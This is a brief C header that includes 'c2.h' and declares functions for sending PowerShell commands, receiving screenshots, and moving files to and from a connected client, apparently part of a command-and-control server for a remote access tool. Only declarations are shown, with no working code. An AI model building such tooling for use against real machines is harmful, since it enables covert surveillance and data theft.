#ifndef UTILS_H
#define UTILS_H

#include "c2.h"

void psh_send(sock_t client_fd);
void recv_screenshot(sock_t client_fd);
void download_file_from_client(sock_t client_fd);
void upload_file_to_client(sock_t client_fd);

#endif /* UTILS_H */